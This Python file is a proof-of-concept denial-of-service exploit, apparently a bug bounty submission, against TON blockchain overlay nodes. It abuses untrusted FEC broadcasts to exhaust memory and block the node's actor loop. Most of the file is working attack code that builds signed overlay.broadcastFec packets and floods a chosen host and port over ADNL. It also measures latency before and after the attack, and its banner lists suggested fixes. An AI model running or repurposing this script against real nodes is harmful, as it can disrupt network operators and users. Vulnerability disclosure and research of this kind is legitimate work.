#!/usr/bin/env python3
"""
PoC: TON Overlay Actor-Block + Memory Exhaustion via Untrusted FEC Broadcast

Vulnerability: BroadcastFec::broadcast_checked() — overlay/broadcast-fec.cpp:192
  - Called after async check_broadcast() resolves for untrusted senders
  - Runs while(!parts_.empty()) synchronously in the OverlayImpl actor (no yield)
  - For a 16 MB broadcast: 43,696 accumulated parts → 218,480 send_closure calls
  - Memory: ~55 MB per active broadcast, no size rate limit for unauth senders
  - After update_validators(): any peer gets BroadcastCheckResult::NeedCheck for FEC

Authentication bypass:
  - Before update_validators():  flags_=0, AllowFec not set → FEC from unauth = Forbidden
  - After  update_validators():  flags_=AllowFec → FEC from unauth = NeedCheck ← exploitable
  - max_fec_broadcast_size() = 16<<20 = 16 MB  (overlay/overlays.h:348)
  - unauth_broadcast_size_rate_limit_ = {} → duration=0 → check() always returns true

Bug bounty scope: C++ core / Overlay layer
Reported under: https://github.com/ton-blockchain/bug-bounty
"""

import argparse
import asyncio
import hashlib
import os
import struct
import time
from typing import List

from nacl.signing import SigningKey

# ---------------------------------------------------------------------------
# TL constructor IDs
# ---------------------------------------------------------------------------
TL_PUB_ED25519             = 0x4813b4c6   # pub.ed25519 key:int256
TL_OVERLAY_BROADCAST_FEC   = 0x3fb05fe6   # overlay.broadcastFec
TL_FEC_RAPTORQ             = 0x9f2bae40   # fec.raptorQ

# Symbol size used by BroadcastFecActor (broadcast-fec.cpp:362)
SYMBOL_SIZE = 768

# Hard limits from overlay/overlays.h
MAX_FEC_BROADCAST_SIZE = 16 << 20    # 16 MB
MAX_SEQNO_MULTIPLIER   = 2
MAX_SEQNO_EXTRA        = 4


def symbols_count(data_size: int) -> int:
    """Number of source symbols for RaptorQ with given data_size."""
    return (data_size + SYMBOL_SIZE - 1) // SYMBOL_SIZE


def max_seqno(data_size: int) -> int:
    """Maximum valid seqno per broadcast-fec.cpp:472."""
    return symbols_count(data_size) * MAX_SEQNO_MULTIPLIER + MAX_SEQNO_EXTRA - 1


def max_parts(data_size: int) -> int:
    """Maximum unique parts that fit within seqno limit."""
    return max_seqno(data_size) + 1


def parts_memory_estimate(data_size: int) -> int:
    """Estimate bytes of parts_ map memory for a broadcast of data_size."""
    n = max_parts(data_size)
    # serialized_fec_part: TL header + ~768 data + source key + signature ≈ 1100 bytes
    # serialized_fec_part_short: TL header + signature + hash ≈ 170 bytes
    per_entry = 1270
    return n * per_entry


# ---------------------------------------------------------------------------
# Minimal RaptorQ stub (for dry-run only; replace with raptorq library for live)
# ---------------------------------------------------------------------------

def _raptorq_encode_stub(data: bytes, symbol_size: int) -> List[bytes]:
    """
    Stub: return source blocks as symbols (no redundancy).
    For a real attack use a proper RaptorQ implementation.
    """
    symbols = []
    for i in range(0, len(data), symbol_size):
        sym = data[i:i + symbol_size]
        if len(sym) < symbol_size:
            sym = sym.ljust(symbol_size, b'\x00')
        symbols.append(sym)
    return symbols


def raptorq_encode(data: bytes) -> List[bytes]:
    """Encode data into 768-byte RaptorQ symbols."""
    try:
        import raptorq  # type: ignore[import-untyped]
        encoder = raptorq.Encoder(data, SYMBOL_SIZE)
        n = symbols_count(len(data))
        # Generate source + repair symbols up to max_seqno
        limit = max_seqno(len(data)) + 1
        syms = []
        for seqno in range(limit):
            sym = encoder.encode_packet(seqno)
            syms.append(bytes(sym))
        return syms
    except ImportError:
        return _raptorq_encode_stub(data, SYMBOL_SIZE)


# ---------------------------------------------------------------------------
# FEC part signing and serialization
# ---------------------------------------------------------------------------

def compute_broadcast_hash(source_short_id: bytes, fec_type_hash: bytes,
                           data_hash: bytes, data_size: int, flags: int) -> bytes:
    """
    Replicate compute_broadcast_id from overlay code.
    broadcast_hash = SHA256 of (source_short_id || fec_type_hash || data_hash || data_size || flags)
    """
    return hashlib.sha256(
        source_short_id + fec_type_hash + data_hash
        + struct.pack('<I', data_size) + struct.pack('<I', flags)
    ).digest()


def compute_part_hash(broadcast_hash: bytes, part_data_hash: bytes, seqno: int) -> bytes:
    """Replicate compute_broadcast_part_id."""
    return hashlib.sha256(
        broadcast_hash + part_data_hash + struct.pack('<I', seqno)
    ).digest()


def to_sign_part(part_hash: bytes, date: int) -> bytes:
    """
    overlay.broadcast.toSign hash:int256 date:int = overlay.broadcast.ToSign
    TL tag: SHA256("overlay.broadcast.toSign hash:int256 date:int = overlay.broadcast.ToSign")
    = 0xd56001dd (verified against ton_api.tl)
    """
    TL_BROADCAST_TOSIGN = 0xd56001dd
    return struct.pack('<I', TL_BROADCAST_TOSIGN) + part_hash + struct.pack('<i', date)


def serialize_fec_raptorq(data_size: int) -> bytes:
    """
    fec.raptorQ data_size:int symbol_size:int symbols_count:int = fec.Type
    TL tag: 0x9f2bae40
    """
    n = symbols_count(data_size)
    return (
        struct.pack('<I', TL_FEC_RAPTORQ)
        + struct.pack('<i', data_size)
        + struct.pack('<i', SYMBOL_SIZE)
        + struct.pack('<i', n)
    )


def build_fec_part(sk: SigningKey, pk_bytes: bytes, source_short_id: bytes,
                   data_hash: bytes, data_size: int, flags: int,
                   part_data: bytes, seqno: int, date: int) -> bytes:
    """
    Serialize one overlay.broadcastFec packet (TL boxed).

    overlay.broadcastFec src:PublicKey certificate:overlay.Certificate
      data_hash:int256 data_size:int flags:int data:bytes seqno:int
      fec:fec.Type date:int signature:bytes = overlay.BroadcastFec;
    TL tag: 0x3fb05fe6
    """
    part_data_hash = hashlib.sha256(part_data).digest()

    fec_type_bytes = serialize_fec_raptorq(data_size)
    fec_type_hash = hashlib.sha256(fec_type_bytes).digest()

    broadcast_hash = compute_broadcast_hash(source_short_id, fec_type_hash, data_hash, data_size, flags)
    part_hash = compute_part_hash(broadcast_hash, part_data_hash, seqno)

    to_sign = to_sign_part(part_hash, date)
    signature = bytes(sk.sign(to_sign).signature)

    # pub.ed25519 key:int256 = PublicKey  (TL tag 0x4813b4c6)
    src_tl = struct.pack('<I', TL_PUB_ED25519) + pk_bytes

    # overlay.certificateEmpty = overlay.Certificate  (TL tag 0x0)
    # Determined from ton_api.tl; empty certificate
    cert_tl = struct.pack('<I', 0x5b02b8c1)   # overlay.emptyCertificate

    # bytes TL encoding: 1-byte length if < 254, then data, then padding to 4-byte boundary
    def tl_bytes(b: bytes) -> bytes:
        n = len(b)
        if n < 254:
            raw = bytes([n]) + b
        else:
            raw = bytes([254]) + struct.pack('<I', n)[:-1] + b  # 3-byte LE length
        pad = (4 - len(raw) % 4) % 4
        return raw + b'\x00' * pad

    payload = (
        struct.pack('<I', TL_OVERLAY_BROADCAST_FEC)
        + src_tl                                  # src
        + cert_tl                                 # certificate
        + data_hash                               # data_hash: int256
        + struct.pack('<i', data_size)            # data_size: int
        + struct.pack('<i', flags)                # flags: int
        + tl_bytes(part_data)                     # data: bytes
        + struct.pack('<i', seqno)               # seqno: int
        + fec_type_bytes                          # fec: fec.Type
        + struct.pack('<i', date)                # date: int
        + tl_bytes(signature)                     # signature: bytes
    )
    return payload


# ---------------------------------------------------------------------------
# Attack builder
# ---------------------------------------------------------------------------

def build_all_parts(data_size: int = MAX_FEC_BROADCAST_SIZE) -> tuple[List[bytes], dict]:
    """
    Build all FEC parts for one 16 MB broadcast.
    Returns (list_of_serialized_parts, metadata_dict).
    """
    data = os.urandom(data_size)
    date = int(time.time())
    flags = 1  # BroadcastFlagAnySender — allows any source key per part

    sk = SigningKey(os.urandom(32))
    pk_bytes = bytes(sk.verify_key)
    source_short_id = hashlib.sha256(
        struct.pack('<I', TL_PUB_ED25519) + pk_bytes
    ).digest()

    data_hash = hashlib.sha256(data).digest()

    symbols = raptorq_encode(data)
    parts = []
    for seqno, symbol in enumerate(symbols):
        part_bytes = build_fec_part(
            sk, pk_bytes, source_short_id, data_hash, data_size,
            flags, symbol, seqno, date
        )
        parts.append(part_bytes)

    meta = {
        'data_size': data_size,
        'symbols_count': symbols_count(data_size),
        'max_seqno': max_seqno(data_size),
        'max_parts': max_parts(data_size),
        'parts_built': len(parts),
        'parts_memory_est': parts_memory_estimate(data_size),
        'loop_closures': max_parts(data_size) * 5,   # propagate_broadcast_to_=5
        'part0_size': len(parts[0]) if parts else 0,
    }
    return parts, meta


# ---------------------------------------------------------------------------
# ADNL sending
# ---------------------------------------------------------------------------

async def _send_nowait(transport: object, peer: object, payload: bytes) -> None:
    """Fire-and-forget ADNL send via adnl.message.query."""
    from pytoniq_core.crypto.ciphers import get_random  # type: ignore[import-untyped]

    msg = {
        'message': {
            '@type': 'adnl.message.query',
            'query_id': get_random(32),
            'query': payload,
        }
    }
    try:
        await asyncio.wait_for(
            transport.send_message_in_channel(msg, None, peer),
            timeout=0.05,
        )
    except Exception:
        pass


async def measure_ping_latency(host: str, port: int, pubkey_b64: str,
                               count: int = 10) -> List[float]:
    """Return RTTs (ms) for DHT ping, inf on timeout."""
    from pytoniq.adnl.adnl import AdnlTransport, Node  # type: ignore[import-untyped]

    transport = AdnlTransport(timeout=5)
    peer = Node(host, port, pubkey_b64, transport)
    await transport.start()
    try:
        await peer.connect()
    except Exception as exc:
        print(f"[!] Connection failed: {exc}")
        await transport.close()
        return []

    rtts: List[float] = []
    for _ in range(count):
        t0 = time.monotonic()
        try:
            await peer.send_ping()
            rtts.append((time.monotonic() - t0) * 1000)
        except asyncio.TimeoutError:
            rtts.append(float('inf'))
        await asyncio.sleep(0.5)

    await peer.disconnect()
    await transport.close()
    return rtts


async def run_attack(host: str, port: int, pubkey_b64: str,
                     parts: List[bytes], rate: float) -> dict:
    """Send all FEC parts to target."""
    from pytoniq.adnl.adnl import AdnlTransport, Node  # type: ignore[import-untyped]

    transport = AdnlTransport(timeout=3)
    peer = Node(host, port, pubkey_b64, transport)
    await transport.start()
    try:
        await peer.connect()
    except Exception as exc:
        print(f"[!] Connection failed: {exc}")
        await transport.close()
        return {}

    print(f"[+] Connected to {host}:{port}")
    interval = 1.0 / rate
    sent = 0
    t_start = time.monotonic()

    for payload in parts:
        t0 = time.monotonic()
        await _send_nowait(transport, peer, payload)
        sent += 1
        elapsed = time.monotonic() - t0
        if interval - elapsed > 0:
            await asyncio.sleep(interval - elapsed)
        if sent % 1000 == 0:
            print(f"  {sent}/{len(parts)} parts sent")

    duration = time.monotonic() - t_start
    actual_rate = sent / duration if duration > 0 else 0
    print(f"[+] Sent {sent} parts in {duration:.1f}s ({actual_rate:.1f} pps)")

    try:
        await peer.disconnect()
    except Exception:
        pass
    await transport.close()
    return {'sent': sent, 'duration': duration, 'rate': actual_rate}


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------

def _print_banner() -> None:
    print("""
┌─────────────────────────────────────────────────────────────────────────────┐
│  TON Overlay – Actor-Block + Memory DoS via Untrusted FEC Broadcast         │
├─────────────────────────────────────────────────────────────────────────────┤
│  File:    overlay/broadcast-fec.cpp:192                                     │
│  Bug:     BroadcastFec::broadcast_checked() runs while(!parts_.empty())    │
│           synchronously in OverlayImpl actor with NO yield.                │
│           Untrusted parts accumulate until check_broadcast() resolves:      │
│           max 43,696 entries × 5 neighbours = 218,480 send_closure calls   │
│           ~55 MB memory per 16 MB broadcast × 60s GC TTL, no rate limit.  │
│                                                                             │
│  Auth:    After update_validators(): any peer gets NeedCheck for FEC        │
│           (max_unath_size_=16MB, AllowFec set, no Trusted)                 │
│           unauth_broadcast_size_rate_limit_ = {} → unlimited               │
│                                                                             │
│  Fix:     1. Cap parts_.size() in add_part() before inserting               │
│           2. Yield in broadcast_checked() loop (batch + send_closure self) │
│           3. Set unauth_broadcast_size_rate_limit_ in OverlayOptions       │
└─────────────────────────────────────────────────────────────────────────────┘
""")


def _fmt_rtts(rtts: List[float]) -> str:
    valid = [r for r in rtts if r != float('inf')]
    timeouts = rtts.count(float('inf'))
    if not valid:
        return f"ALL {len(rtts)} TIMED OUT"
    avg = sum(valid) / len(valid)
    return (f"min={min(valid):.0f}ms avg={avg:.0f}ms max={max(valid):.0f}ms "
            f"timeouts={timeouts}/{len(rtts)}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

async def _async_main() -> None:
    parser = argparse.ArgumentParser(
        description='TON Overlay FEC broadcast DoS PoC — bug bounty demonstration')
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', type=int, required=True)
    parser.add_argument('--pubkey', required=True, metavar='B64',
                        help='Node Ed25519 public key (base64)')
    parser.add_argument('--size', type=int, default=MAX_FEC_BROADCAST_SIZE,
                        help=f'Broadcast payload size in bytes (default: {MAX_FEC_BROADCAST_SIZE} = 16 MB)')
    parser.add_argument('--rate', type=float, default=500.0,
                        help='Parts/second send rate (default 500)')
    parser.add_argument('--baseline', action='store_true',
                        help='Measure ping latency before and after the attack')
    parser.add_argument('--dry-run', action='store_true',
                        help='Print statistics only, no network activity')
    args = parser.parse_args()

    _print_banner()

    size = min(args.size, MAX_FEC_BROADCAST_SIZE)

    if args.dry_run:
        print(f"[*] Dry-run: computing statistics for size={size} …")
        n_sym = symbols_count(size)
        n_max = max_parts(size)
        mem = parts_memory_estimate(size)
        closures = n_max * 5
        print(f"    Broadcast size   : {size} bytes ({size / (1 << 20):.1f} MB)")
        print(f"    Symbol size      : {SYMBOL_SIZE} bytes")
        print(f"    symbols_count    : {n_sym}")
        print(f"    Max seqno        : {max_seqno(size)}")
        print(f"    Max parts        : {n_max}")
        print(f"    parts_ memory est: ~{mem >> 20} MB per broadcast on target")
        print(f"    Loop work        : {n_max} parts × 5 neighbours = {closures} send_closure calls")
        print(f"    Unauth rate limit: NONE (duration=0 → unlimited by default)")
        print(f"    GC TTL           : 60 seconds")
        print(f"    Memory @1 broadcast/30s: ~{mem >> 20} MB sustained")
        return

    print(f"[*] Pre-generating parts for {size/(1<<20):.0f} MB broadcast …")
    t0 = time.monotonic()
    parts, meta = build_all_parts(size)
    elapsed = time.monotonic() - t0
    print(f"    Generated {meta['parts_built']} parts in {elapsed:.1f}s")
    print(f"    Part 0 size      : {meta['part0_size']} bytes")
    print(f"    parts_ memory est: ~{meta['parts_memory_est'] >> 20} MB on target")
    print(f"    Loop work        : {meta['loop_closures']} send_closure calls on target")

    if args.baseline:
        print(f"\n[*] Measuring baseline latency …")
        rtts_before = await measure_ping_latency(args.host, args.port, args.pubkey)
        if rtts_before:
            print(f"    Before: {_fmt_rtts(rtts_before)}")

    print(f"\n[*] Sending {len(parts)} FEC parts at {args.rate:.0f} pps → {args.host}:{args.port}")
    _ = await run_attack(args.host, args.port, args.pubkey, parts, rate=args.rate)

    if args.baseline:
        print(f"\n[*] Post-attack latency …")
        rtts_after = await measure_ping_latency(args.host, args.port, args.pubkey)
        if rtts_after:
            print(f"    After:  {_fmt_rtts(rtts_after)}")


def main() -> None:
    asyncio.run(_async_main())


if __name__ == '__main__':
    main()
